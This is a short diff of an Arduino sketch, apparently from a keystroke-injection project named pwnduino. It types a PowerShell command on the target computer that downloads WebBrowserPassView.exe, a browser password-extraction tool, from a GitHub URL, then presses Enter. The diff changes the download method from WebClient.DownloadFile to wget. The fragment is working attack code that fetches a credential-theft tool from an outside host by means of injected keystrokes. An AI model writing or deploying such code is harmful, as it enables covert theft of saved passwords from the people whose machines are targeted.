@@ -38,7 +38,7 @@ void setup()
    delay(500);
 
    // Run powershell command
-   keyString("powershell (new-object System.Net.WebClient).DownloadFile(('https://github.com/ex0dus-0x/pwnduino/blob/master/deps/WebBrowserPassView.exe', 'WebBrowserPassView.exe')");
+   keyString("powershell wget https://github.com/ex0dus-0x/pwnduino/blob/master//WebBrowserPassView.exe/ -Outfile WebBrowserPassView.exe");
    delay(500);
    keyPress(0, KEY_ENTER);
    keyRelease();
